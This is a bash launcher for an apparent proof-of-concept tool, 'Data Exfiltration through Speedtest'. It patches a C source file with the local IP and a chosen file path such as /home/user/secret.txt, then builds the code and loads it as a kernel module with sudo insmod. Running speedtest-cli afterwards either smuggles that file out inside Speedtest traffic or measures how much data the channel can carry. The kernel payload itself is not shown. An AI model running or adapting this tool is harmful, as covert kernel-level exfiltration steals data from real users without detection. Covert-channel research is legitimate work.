#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
ITALIC='\033[3m'
SPEEDTEST_PURPLE='\033[38;2;139;92;246m'
NC='\033[0m'

echo -e "${BOLD}${SPEEDTEST_PURPLE}╔════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}║  Data Exfiltration through Speedtest   ║${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}║  ${DIM}${ITALIC}Author: Janessa Palmieri${NC}${BOLD}${SPEEDTEST_PURPLE}           ║${NC}"
echo -e "${BOLD}${SPEEDTEST_PURPLE}╚════════════════════════════════════════╝${NC}"

# Detect client IP
source_ip=$(ip a | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
echo -e "${YELLOW}Using SOURCE_IP: $source_ip${NC}"

# Modify constants in C file
sed -i "s|#define SOURCE_IP.*|#define SOURCE_IP \"$source_ip\"|" speedtest-exfil.c

# Function selection
echo ""
echo -e "${BOLD}Select function to run:${NC}"
echo "1) max_bytes_exfiled() - calculate max exfiltration capacity"
echo "2) exfil_file()        - exfiltrate a file"
read -p "Enter 1 or 2: " choice

if [ "$choice" == "1" ]; then
    sed -i "s|        exfil_file(skb, tcp_payloadoffset);|        //exfil_file(skb, tcp_payloadoffset);|" speedtest-exfil.c
    sed -i "s|        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|        max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
    sed -i "s|//	pr_info(\"Total bytes exfiled|	pr_info(\"Total bytes exfiled|" speedtest-exfil.c
elif [ "$choice" == "2" ]; then
    read -p "Enter TEST_FILE path (e.g. /home/user/secret.txt): " test_file
    sed -i "s|#define TEST_FILE.*|#define TEST_FILE \"$test_file\"|" speedtest-exfil.c
    sed -i "s|        //exfil_file(skb, tcp_payloadoffset);|        exfil_file(skb, tcp_payloadoffset);|" speedtest-exfil.c
    sed -i "s|        max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|        //max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);|" speedtest-exfil.c
    sed -i "s|	pr_info(\"Total bytes exfiled|//	pr_info(\"Total bytes exfiled|" speedtest-exfil.c
else
    echo -e "${RED}Invalid choice. Exiting.${NC}"
    exit 1
fi

# Build and load
echo ""
echo -e "${YELLOW}Building...${NC}"
make

echo -e "${YELLOW}Loading LKM...${NC}"
sudo insmod speedtest-exfil.ko

echo ""
if [ "$choice" == "1" ]; then
    echo -e "${GREEN}Running speedtest...${NC}"
    speedtest-cli
    sudo rmmod speedtest_exfil && make clean
    echo ""
    echo -e "${BOLD}${CYAN}Total exfil output:${NC}"
    sudo dmesg | tail -1
else
    echo -e "${GREEN}Done! Run your Speedtest now.${NC}"
    echo -e "When finished, run: ${YELLOW}sudo rmmod speedtest-exfil.ko && make clean${NC}"
fi